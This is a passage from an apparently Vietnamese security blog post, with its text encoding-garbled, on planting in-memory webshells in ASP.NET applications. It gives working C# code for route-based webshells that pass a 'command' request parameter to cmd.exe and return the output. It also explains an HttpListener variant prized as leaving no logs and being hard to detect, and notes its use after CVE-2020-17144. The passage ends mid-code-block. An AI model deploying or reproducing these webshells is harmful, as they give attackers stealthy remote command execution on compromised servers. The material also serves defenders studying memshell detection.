1 abstract class nÃªn mÃ¬nh cáº§n override 2 method GetRouteData vÃ  GetVirtualPath cÃ³ trong nÃ³:<br><img src=https://hackmd.io/_uploads/By8ODGsS-l.png loading=lazy alt=image><br>Hai method nháº­n vÃ o cÃ¡c tham sá»‘ khÃ¡c nhau nhÆ°ng Ä‘á»u cÃ³ object context cá»§a current request nÃªn Ä‘á»u cÃ³ thá»ƒ sá»­ dá»¥ng Ä‘Æ°á»£c. CÃ´ng dá»¥ng cá»§a chÃºng gáº§n nhÆ° ngÆ°á»£c nhau:</p><ul><li>GetRouteData: Tráº£ vá» cÃ¡c thÃ´ng tin routing cá»§a request khi request match vá»›i route</li><li>GetVirtualPath: Láº¥y thÃ´ng tin vá» route cá»§a request khi request match vá»›i value truyá»n vÃ o</li></ul><p>MÃ¬nh cÃ³ script ngáº¯n nÃ y Ä‘á»ƒ check xem method nÃ o Ä‘Æ°á»£c thá»±c hiá»‡n trÆ°á»›c:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;script runat=&#34;server&#34;&gt;
</span></span><span class=line><span class=cl>    public class MyRouteBase : RouteBase{
</span></span><span class=line><span class=cl>        public override RouteData GetRouteData(HttpContextBase httpContext){
</span></span><span class=line><span class=cl>            Console.WriteLine(&#34;GetRouteData is called!!&#34;);
</span></span><span class=line><span class=cl>            return null;
</span></span><span class=line><span class=cl>        }
</span></span><span class=line><span class=cl>        public override VirtualPathData GetVirtualPath(RequestContext requestContext, RouteValueDictionary values){
</span></span><span class=line><span class=cl>            Console.WriteLine(&#34;GetVirtualPath is called!!&#34;);
</span></span><span class=line><span class=cl>            return null;
</span></span><span class=line><span class=cl>        }}
</span></span><span class=line><span class=cl>&lt;/script&gt;
</span></span></code></pre></td></tr></table></div></div><p>Káº¿t quáº£ thÃ¬ GetRouteData Ä‘Æ°á»£c gá»i trÆ°á»›c, mÃ¬nh sáº½ dÃ¹ng method nÃ y:<br><img src=https://hackmd.io/_uploads/rkg6PfoBWg.png loading=lazy alt=image><br>Khi debug vÃ o chÆ°Æ¡ng trÃ¬nh thÃ¬ vá»›i má»—i request, vá»›i má»—i RouteBase thÃ¬ cÃ¡c method GetRouteData vÃ  GetVirtualPath Ä‘á»u Ä‘Æ°á»£c gá»i láº§n lÆ°á»£t thÃ´ng qua cÃ¢u lá»‡nh foreach:<br><img src=https://hackmd.io/_uploads/S1lyuzsHZg.png loading=lazy alt=image><br><img src=https://hackmd.io/_uploads/r1VyOGjHZg.png loading=lazy alt=image><br>Äá»ƒ route cá»§a báº£n thÃ¢n chÃ¨n vÃ o Ä‘Æ°á»£c cháº¡y Ä‘áº§u tiÃªn trong vÃ²ng for thÃ¬ Ä‘Æ¡n giáº£n mÃ¬nh Insert vÃ o vá»‹ trÃ­ Ä‘áº§u tiÃªn lÃ  Ä‘Æ°á»£c:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>RouteCollection routes = RouteTable.Routes;
</span></span><span class=line><span class=cl>routes.Insert(0, new MyRouteBase());
</span></span></code></pre></td></tr></table></div></div><p>MÃ¬nh sáº½ cÃ³ code deploy route memshell nhÆ° nÃ y:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>public class CustomRouteBase : RouteBase{
</span></span><span class=line><span class=cl>    public override RouteData GetRouteData(HttpContextBase httpContext){
</span></span><span class=line><span class=cl>       String cmd = httpContext.Request.QueryString[&#34;command&#34;]; 
</span></span><span class=line><span class=cl>       if (cmd != null){
</span></span><span class=line><span class=cl>          HttpResponseBase response = httpContext.Response;
</span></span><span class=line><span class=cl>          Process p = new Process();
</span></span><span class=line><span class=cl>          p.StartInfo.FileName = &#34;cmd.exe&#34;;
</span></span><span class=line><span class=cl>          p.StartInfo.Arguments = &#34;/c&#34; + cmd;
</span></span><span class=line><span class=cl>          p.Start();
</span></span><span class=line><span class=cl>          byte[] data = Encoding.UTF8.GetBytes(p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd());
</span></span><span class=line><span class=cl>          response.Write(System.Text.Encoding.Default.GetString(data));
</span></span><span class=line><span class=cl>          response.End();
</span></span><span class=line><span class=cl>       }
</span></span><span class=line><span class=cl>       return null;
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>    public override VirtualPathData GetVirtualPath(RequestContext requestContext, RouteValueDictionary values){
</span></span><span class=line><span class=cl>       return null;
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>RouteCollection routeCollection = RouteTable.Routes;
</span></span><span class=line><span class=cl>routeCollection.Insert(0, new CustomRouteBase());
</span></span></code></pre></td></tr></table></div></div><p>We got memshell in arbitrary route bois:<br><img src=https://hackmd.io/_uploads/rJRKOfjHWe.png loading=lazy alt=image></p><h3 id=sá»­-dá»¥ng-systemwebroutingroute>Sá»­ dá»¥ng System.Web.Routing.Route</h3><p>Náº¿u nhÆ° khÃ´ng muá»‘n tá»± táº¡o class implement RouteBRase thÃ¬ mÃ¬nh cÃ³ thá»ƒ sá»­ dá»¥ng public class System.Web.Routing.Route:<br><img src=https://hackmd.io/_uploads/rJTEcMjSbl.png loading=lazy alt=image><br>Má»™t Route há»£p lá»‡ thÃ¬ cáº§n truyá»n vÃ o hai tham sá»‘:</p><ul><li>Url dÃ¹ng Ä‘á»ƒ chá»©a giÃ¡ trá»‹ Ä‘Æ°á»ng dáº«n cho route</li><li>RouteHandler Ä‘á»ƒ truyá»n vÃ o handler cho route Ä‘Ã³, vá»›i kiá»ƒu IRouteHandler</li></ul><p>Nháº£y vÃ o IRouteHandler interface, Ä‘á»ƒ implement Ä‘Æ°á»£c interface nÃ y, cáº§n pháº£i override method GetHttpHandler Ä‘á»ƒ xá»­ lÃ½ HTTP Response tráº£ vá» cho ngÆ°á»i dÃ¹ng. Vá»«a hay khi method GetHttpHandler nháº­n Ä‘áº§u vÃ o lÃ  RequestContext â€“ má»™t encapsulation object cá»§a current HTTP request, nÃªn mÃ¬nh cÃ³ thá»ƒ xÃ i nÃ³ Ä‘á»ƒ control request vÃ o vÃ  response ra:<br><img src=https://hackmd.io/_uploads/S1macfjrWx.png loading=lazy alt=image><br>Sá»­ dá»¥ng logic bÃªn trÃªn, mÃ¬nh cook thÃ nh Ä‘oáº¡n code nhÆ° nÃ y:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>public class CustomRoute : IRouteHandler {
</span></span><span class=line><span class=cl>    public IHttpHandler GetHttpHandler(RequestContext requestContext){
</span></span><span class=line><span class=cl>        String cmd = requestContext.HttpContext.Request.Form[&#34;command&#34;]; 
</span></span><span class=line><span class=cl>        if (cmd != null){
</span></span><span class=line><span class=cl>            HttpResponseBase response = requestContext.HttpContext.Response;
</span></span><span class=line><span class=cl>            Process p = new Process();
</span></span><span class=line><span class=cl>            p.StartInfo.FileName = &#34;cmd.exe&#34;;
</span></span><span class=line><span class=cl>            p.StartInfo.Arguments = &#34;/c&#34; + cmd;
</span></span><span class=line><span class=cl>            p.Start();
</span></span><span class=line><span class=cl>            byte[] data = Encoding.UTF8.GetBytes(p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd());
</span></span><span class=line><span class=cl>response.Write(System.Text.Encoding.Default.GetString(data));
</span></span><span class=line><span class=cl>        }
</span></span><span class=line><span class=cl>        return null;
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>RouteCollection routeCollection = RouteTable.Routes;
</span></span><span class=line><span class=cl>Route customRoute = new Route(&#34;RouteMemshell&#34;, new CustomRoute());
</span></span><span class=line><span class=cl>routeCollection.Insert(0, customRoute);
</span></span></code></pre></td></tr></table></div></div><p>NhÆ°ng mÃ  khi gá»i Ä‘áº¿n <code>/RouteMemshell</code> thÃ¬ mÃ¬nh bá»‹ lá»—i 500, lá»—i nÃ y do CustomRoute táº¡o ra khÃ´ng tráº£ vá» object cÃ³ dáº¡ng IHttpHandler:<br><img src=https://hackmd.io/_uploads/BJHNjfjHZg.png loading=lazy alt=image><br>Cáº§n sá»­a láº¡i code xÃ­u Ä‘á»ƒ lÆ°á»£m Ä‘Æ°á»£c output táº¡i response. Cá»¥ thá»ƒ lÃ  method GetHttpHandler cáº§n return object implement interface IHttpHandler thay vÃ¬ chá»‰ exec command.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>public class CustomRoute : IRouteHandler {
</span></span><span class=line><span class=cl>    public IHttpHandler GetHttpHandler(RequestContext requestContext){
</span></span><span class=line><span class=cl>        return new CustomHandler(requestContext);
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>public class CustomHandler : IHttpHandler{
</span></span><span class=line><span class=cl>    public RequestContext RequestContext { get; private set; }
</span></span><span class=line><span class=cl>    public CustomHandler(RequestContext context){
</span></span><span class=line><span class=cl>        this.RequestContext = context;
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>    public void ProcessRequest(HttpContext context){
</span></span><span class=line><span class=cl>        String cmd = context.Request.Form[&#34;command&#34;]; 
</span></span><span class=line><span class=cl>        if (cmd != null){
</span></span><span class=line><span class=cl>            HttpResponse response = context.Response;
</span></span><span class=line><span class=cl>            Process p = new Process();
</span></span><span class=line><span class=cl>            p.StartInfo.FileName = &#34;cmd.exe&#34;;
</span></span><span class=line><span class=cl>            p.StartInfo.Arguments = &#34;/c&#34; + cmd;
</span></span><span class=line><span class=cl>            p.Start();
</span></span><span class=line><span class=cl>            byte[] data = Encoding.UTF8.GetBytes(p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd());
</span></span><span class=line><span class=cl>            response.Write(System.Text.Encoding.Default.GetString(data));
</span></span><span class=line><span class=cl>        }
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>    public bool IsReusable { get; }
</span></span><span class=line><span class=cl>}
</span></span></code></pre></td></tr></table></div></div><p>NhÆ° nÃ y thÃ¬ cÃ³ thá»ƒ láº¥y Ä‘Æ°á»£c response rá»“i:<br><img src=https://hackmd.io/_uploads/ryZToMjBbg.png loading=lazy alt=image><br>Máº·c dÃ¹ khÃ´ng thá»ƒ khai bÃ¡o cho cÃ³ thá»ƒ truy cáº­p route memory webshell báº±ng Ä‘Æ°á»ng dáº«n tÃ¹y Ã½ nhÆ°ng cÃ³ thá»ƒ sá»­ dá»¥ng dáº¥u {} Ä‘á»ƒ biá»ƒu diá»…n kÃ½ tá»± ngáº«u nhiÃªn. MÃ¬nh vÃ­ dá»¥ nhÆ° nÃ y:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Route customRoute = new Route(&#34;route{xxx}&#34;, new CustomRoute());
</span></span></code></pre></td></tr></table></div></div><p>ThÃ¬ cÃ³ thá»ƒ sá»­ dá»¥ng route memory webshell vá»›i Ä‘Æ°á»ng dáº«n &ldquo;route&rdquo; káº¿t há»£p vá»›i cÃ¡c kÃ½ tá»± báº¥t ká»³:<br><img src=https://hackmd.io/_uploads/SkYm7YjS-x.png loading=lazy alt=image></p><h2 id=httplistener-memory-webshell>HTTPListener Memory Webshell</h2><p>HttpListener lÃ  1 class thuá»™c .NET Base Class Library, cung cáº¥p kháº£ nÄƒng khá»Ÿi táº¡o má»™t HTTP server Ä‘Æ¡n giáº£n vÃ  cÃ³ kháº£ nÄƒng tÃ¹y biáº¿n cao (nghe khÃ¡ giá»‘ng vá»›i <code>python3 -m http.server</code>) ğŸ‘Œ<br>KhÃ´ng phá»¥ thuá»™c hay cháº¡y qua IIS cÅ©ng nhÆ° khÃ´ng náº±m trong cÃ¡c thÃ nh pháº§n cá»§a má»™t project ASP.NET, HttpListener chá»‰ cáº§n truyá»n vÃ o Ä‘á»‹a chá»‰ láº¯ng nghe, port vÃ  Ä‘Æ°á»ng dáº«n Ä‘á»ƒ khá»Ÿi táº¡o má»™t web service.<br><img src=https://hackmd.io/_uploads/H1pTrdsSWg.png loading=lazy alt=image><br>Do Ä‘áº·c tÃ­nh hoáº¡t Ä‘á»™ng lÃ  1 service Ä‘á»™c láº­p nÃªn cháº¯c cháº¯n nÃ³ sáº½ khÃ´ng lÆ°u láº¡i log trÃªn server, Ä‘á»“ng thá»i cÃ³ thá»ƒ run cÃ¹ng port, cÃ¹ng host vá»›i service web khiáº¿n nÃ³ khÃ¡ khÃ³ phÃ¡t hiá»‡n náº¿u nhÆ° Ä‘Æ°á»£c deploy.<br>Tuy nhiÃªn, trong cÃ¡c blog mÃ¬nh tham kháº£o thÃ¬ há» cÃ³ nÃ³i ráº±ng ká»¹ thuáº­t nÃ y chá»‰ cÃ³ thá»ƒ Ä‘Æ°á»£c triá»ƒn khai vá»›i quyá»n System. Äiá»u nÃ y khÃ¡ khÃ³ xáº£y ra do thÃ´ng thÆ°á»ng user deploy webapps sáº½ lÃ  user IIS (default iis apppool\{pool name}). Ngoáº¡i trá»« má»™t sá»‘ trÆ°á»ng há»£p nhÆ° Ä‘á»‘i vá»›i Microsoft Exchange sáº½ máº·c Ä‘á»‹nh cháº¡y quyá»n System nÃªn ká»¹ thuáº­t nÃ y Ä‘Ã£ Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ lÃ m post-exploit memshell sau khi khai thÃ¡c lá»—i deser <a class=link href=https://www.zcgonvh.com/post/analysis_of_CVE-2020-17144_and_to_weaponizing.html target=_blank rel=noopener>CVE-2020-17144</a></p><h3 id=phÃ¢n-tÃ­ch>PhÃ¢n tÃ­ch</h3><p>Vá» cÆ¡ báº£n thÃ¬ ká»¹ thuáº­t nÃ y sáº½ khá»Ÿi táº¡o má»™t service web riÃªng biá»‡t nÃªn sáº½ khÃ´ng cháº¡y chÃ¨n vÃ o má»™t class nÃ o cá»§a service web hiá»‡n táº¡i. CÃ´ng viá»‡c cÃ²n láº¡i lÃ  xá»­ lÃ½ HTTP Request Ä‘á»ƒ nháº­n Ä‘Æ°á»£c Ä‘áº§u vÃ o, xá»­ lÃ½ logic vÃ  tráº£ káº¿t quáº£ vá» táº¡i response.<br>Táº¡i namespace System.Net Ä‘Ã£ tá»“n táº¡i System.Net.HttpListenerContext Ä‘Ã³ng vai trÃ² nháº­n, xá»­ lÃ½ vÃ  tráº£ vá» káº¿t quáº£ cho má»™t HTTP Request nhÆ° lÃ  HttpContext thuá»™c namespace System.Web. NhÆ°ng class HttpListenerRequest khÃ¡ thÃ´ sÆ¡ vÃ  khÃ´ng cÃ³ cÃ¡c phÆ°Æ¡ng thá»©c xá»­ lÃ½ input nhÆ° lÃ  System.Web.Request, nÃªn viá»‡c nháº­n vÃ  xá»­ lÃ½ dá»¯ liá»‡u lÃ  Ä‘iá»u khÃ¡ khÃ³ khÄƒn.<br>Giáº£i phÃ¡p Ä‘Æ°a ra lÃ  láº¥y háº¿t dá»¯ liá»‡u trong object HttpListenerRequest vÃ  HttpListenerResponse, tá»« Ä‘Ã³ tá»± craft thÃ nh System.Web.HttpRequest Ä‘á»ƒ nháº­n/xá»­ lÃ½ dá»¯ liá»‡u.<br>Cá»© tÆ°á»Ÿng lÃ  ngon Äƒn, nhÆ°ng quÃ¡ trÃ¬nh parse HTTP Request gáº·p váº¥n Ä‘á» khi HttpRequest khÃ´ng nháº­n Ä‘Æ°á»£c tham sá»‘ táº¡i POST body request, máº·c dÃ¹ váº«n thá»±c hiá»‡n Ä‘Æ°á»£c cÃ¡c hÃ m tÄ©nh. Äá»ƒ lÃ m rÃµ hÆ¡n thÃ¬ mÃ¬nh cÃ³ Ä‘oáº¡n code:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>HttpListenerContext context = listener.GetContext();
</span></span><span class=line><span class=cl>HttpListenerRequest request = context.Request;
</span></span><span class=line><span class=cl>HttpListenerResponse response = context.Response;
</span></span><span class=line><span class=cl>try {
</span></span><span class=line><span class=cl>    // Láº¥y data tá»« request
</span></span><span class=line><span class=cl>    string data = new StreamReader(request.InputStream, request.ContentEncoding).ReadToEnd();
</span></span><span class=line><span class=cl>    // ÄÆ°a data vá» dáº¡ng byte
</span></span><span class=line><span class=cl>    byte[] rawData = Encoding.Default.GetBytes(data);
</span></span><span class=line><span class=cl>    // Khá»Ÿi tao object HttpRequst thuá»™c namespace System.Web Ä‘á»ƒ sá»­ dá»¥ng request linh hoáº¡t hÆ¡n
</span></span><span class=line><span class=cl>    HttpRequest req = new HttpRequest(&#34;&#34;, request.Url.ToString(), request.QueryString.ToString());
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    // Kiá»ƒm tra giÃ¡ trá»‹ cá»§a biáº¿n test
</span></span><span class=line><span class=cl>    String test = req.Form[&#34;test&#34;];
</span></span><span class=line><span class=cl>    if (test != null) { Console.WriteLine(&#34;Parameter test = &#34; + test); }
</span></span><span class=line><span class=cl>    else { Console.WriteLine(&#34;Parameter test is null!!!&#34;); }
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>catch (Exception e){ return; }
</span></span><span class=line><span class=cl>â€¦
</span></span><span class=line><span class=cl>CustomListener(&#34;http://localhost:8000/test/&#34;);
</span></span></code></pre></td></tr></table></div></div><p>Khi gá»­i mÃ¬nh post Ä‘áº¿n service thÃ¬ chá»‰ nháº­n Ä‘Æ°á»£c thÃ´ng bÃ¡o null, chá»©ng tá» HttpRequest khÃ´ng láº¥y Ä‘Æ°á»£c dá»¯ liá»‡u cá»§a POST body:<br><img src=https://hackmd.io/_uploads/SJJrtOorbe.png loading=lazy alt=image><br>Äáº¿n nÆ°á»›c nÃ y thÃ¬ mÃ¬nh cáº§n Ä‘i vÃ o source Ä‘á»ƒ xem xÃ©t rá»“i. HÃ m xá»­ lÃ½ thá»±c cháº¥t sáº½ Ä‘i qua method EnsureForm dÃ¹ng Ä‘á»ƒ kiá»ƒm tra xem Form cÃ³ há»£p lá»‡ hay khÃ´ng, sau Ä‘Ã³ tráº£ vá» thuá»™c tÃ­nh <code>_form</code> cá»§a object Ä‘á»ƒ xá»­ lÃ½, tá»« Ä‘Ã³ suy ra thuá»™c tÃ­nh <code>_form</code> chÃ­nh lÃ  nÆ¡i lÆ°u trá»¯ dá»¯ liá»‡u cá»§a POST body trong má»™t HTTP Request:<br><img src=https://hackmd.io/_uploads/H1yFtOiB-e.png loading=lazy alt=image><br>Táº¡i Ä‘Ã¢y, EnsureForm check náº¿u thuá»™c tÃ­nh <code>_form</code> lÃ  null vÃ  thuá»™c tÃ­nh <code>_wr</code> khÃ¡c null thÃ¬ sáº½ gá»i Ä‘áº¿n FillInFormCollection Ä‘á»ƒ Ä‘iá»n thÃ´ng tin vÃ o form má»›i, cÃ²n náº¿u nhÆ° <code>_wr</code> lÃ  null thÃ¬ tiáº¿n hÃ nh set thuá»™c tÃ­nh cho form hiá»‡n táº¡i lÃ  Read Only. CÃ²n trong trÆ°á»ng há»£p <code>_form</code> Ä‘Ã£ tá»“n táº¡i tá»©c khÃ¡c null sáº½ tráº£ vá» <code>_form</code> Ä‘Ã³ luÃ´n:<br><img src=https://hackmd.io/_uploads/BkWptOorZg.png loading=lazy alt=image><br>Tiáº¿p tá»¥c nháº£y vÃ o method FillInFormCollection, Ä‘Ã¢y lÃ  nÆ¡i xá»­ lÃ½ dá»¯ liá»‡u hay Ä‘á»ƒ Ä‘iá»n dá»¯ liá»‡u vÃ o <code>_form</code>. Do muá»‘n xá»­ lÃ½ kiá»ƒu key-param nÃªn mÃ¬nh chÃº Ã½ Ä‘áº¿n content-type application/x-www-form-urlencoded trÆ°á»›c:<br><img src=https://hackmd.io/_uploads/HJNf5_orZx.png loading=lazy alt=image><br>Táº¡i Ä‘Ã¢y mÃ¬nh tháº¥y dá»¯ liá»‡u Ä‘Æ°á»£c fill thÃ´ng qua hÃ m FillFromEncodedBytes vá»›i 2 tham sá»‘: : dá»¯ liá»‡u dÆ°á»›i dáº¡ng byte vÃ  loáº¡i encoding.
CÃ²n láº¡i, náº¿u nhÆ° kiá»ƒu content-type lÃ  multipart/form-data, lÃ  dá»¯ liá»‡u Ä‘Æ°á»£c gá»­i lÃªn cÃ³ boundary, thÆ°á»ng Ä‘Æ°á»£c dÃ¹ng Ä‘á»ƒ upload file thÃ¬ sáº½ cháº¡y vÃ²ng for Ä‘á»ƒ thÃªm giÃ¡ trá»‹ cá»§a tá»«ng tham sá»‘ má»™t trong form theo thá»© tá»±:<br><img src=https://hackmd.io/_uploads/B13Y5diH-x.png loading=lazy alt=image><br>NhÆ° váº­y, Ä‘á»ƒ cÃ³ thá»ƒ lÆ°u Ä‘Æ°á»£c dá»¯ liá»‡u trong POST body vÃ o <code>_form</code> thÃ¬ ta cáº§n má»™t trong hai Ä‘iá»u kiá»‡n:
<code>_wr</code> khÃ¡c null hoáº·c <code>_form</code> khÃ¡c null.
Xem xÃ©t Ä‘áº¿n kháº£ nÄƒng Ä‘áº§u tiÃªn, <code>_wr</code> chá»‰ cÃ³ thá»ƒ Ä‘Æ°á»£c set trong quÃ¡ trÃ¬nh khá»Ÿi táº¡o object class HttpRequest. Chá»‰ cÃ³ constructor Ä‘áº§u tiÃªn cÃ³ thá»ƒ chÃ¨n Ä‘Æ°á»£c giÃ¡ trá»‹ vÃ o <code>_wr</code>, nhÆ°ng chá»‰ cÃ³ constructor thá»© 2 lÃ  public tá»©c cÃ³ thá»ƒ gá»i trá»±c tiáº¿p tá»« public class HttpRequest.<br><img src=https://hackmd.io/_uploads/BJEbs_srZg.png loading=lazy alt=image><br>Náº¿u váº­y thÃ¬ mÃ¬nh sáº½ Ä‘i theo hÆ°á»›ng thá»© 2, lÃ m cho <code>_form</code> khÃ¡c null. KhÃ´ng cáº§n pháº£i gÃ¡n thÃ´ng qua viá»‡c khá»Ÿi táº¡o má»™t HttpWorkerRequest mÃ  sá»­ dá»¥ng reflection Ä‘á»ƒ khá»Ÿi táº¡o má»™t object cÃ³ kiá»ƒu dá»¯ liá»‡u HttpValueCollection giá»‘ng <code>_form</code>, vÃ  tá»« Ä‘Ã³ gá»i Ä‘áº¿n method FillFromEncodedBytes, truyá»n tháº³ng dá»¯ liá»‡u cá»§a body request vÃ o method Ä‘Ã³. Äoáº¡n mÃ£ thá»±c hiá»‡n sáº½ nhÆ° sau:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>FieldInfo</span> <span class=n>field</span> <span class=o>=</span> <span class=n>req</span><span class=o>.</span><span class=n>GetType</span><span class=p>()</span><span class=o>.</span><span class=n>GetField</span><span class=p>(</span><span class=s2>&#34;_form&#34;</span><span class=p>,</span> <span class=n>BindingFlags</span><span class=o>.</span><span class=n>Instance</span> <span class=o>|</span> <span class=n>BindingFlags</span><span class=o>.</span><span class=n>NonPublic</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=n>Type</span> <span class=n>formtype</span> <span class=o>=</span> <span class=n>field</span><span class=o>.</span><span class=n>FieldType</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>MethodInfo</span> <span class=n>method</span> <span class=o>=</span> <span class=n>formtype</span><span class=o>.</span><span class=n>GetMethod</span><span class=p>(</span><span class=s2>&#34;FillFromEncodedBytes&#34;</span><span class=p>,</span> <span class=n>BindingFlags</span><span class=o>.</span><span class=n>Instance</span> <span class=o>|</span> <span class=n>BindingFlags</span><span class=o>.</span><span class=n>NonPublic</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=n>ConstructorInfo</span> <span class=n>constructor</span> <span class=o>=</span> <span class=n>formtype</span><span class=o>.</span><span class=n>GetConstructor</span><span class=p>(</span><span class=n>BindingFlags</span><span class=o>.</span><span class=n>NonPublic</span> <span class=o>|</span> <span class=n>BindingFlags</span><span class=o>.</span><span class=n>Instance</span><span class=p>,</span> <span class=n>null</span><span class=p>,</span> <span class=n>new</span> <span class=n>Type</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>null</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=n>object</span> <span class=n>obj</span> <span class=o>=</span> <span class=n>constructor</span><span class=o>.</span><span class=n>Invoke</span><span class=p>(</span><span class=n>null</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=n>method</span><span class=o>.</span><span class=n>Invoke</span><span class=p>(</span><span class=n>obj</span><span class=p>,</span> <span class=n>new</span> <span class=n>object</span><span class=p>[]</span> <span class=p>{</span> <span class=n>rawData</span><span class=p>,</span> <span class=n>request</span><span class=o>.</span><span class=n>ContentEncoding</span> <span class=p>});</span>
</span></span><span class=line><span class=cl><span class=n>field</span><span class=o>.</span><span class=n>SetValue</span><span class=p>(</span><span class=n>req</span><span class=p>,</span> <span class=n>obj</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>ThÃªm chá»— nÃ y vÃ o Ä‘oáº¡n code test vÃ  á»‘p nguyÃªn request trÆ°á»›c, láº§n nÃ y thÃ¬ mÃ¬nh Ä‘Ã£ láº¥y Ä‘Æ°á»£c value cho param test:<br><img src=https://hackmd.io/_uploads/ryYFi_oHZe.png loading=lazy alt=image><br></p><h3 id=deploy-1>Deploy</h3><p>Äoáº¡n code mÃ¬nh táº¡o má»™t HTTPListener, chá»‰ thÃªm pháº§n xá»­ lÃ½ Ä‘áº§u vÃ o vÃ  hiá»ƒn thá»‹ ra ngoÃ i thÃ´i:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
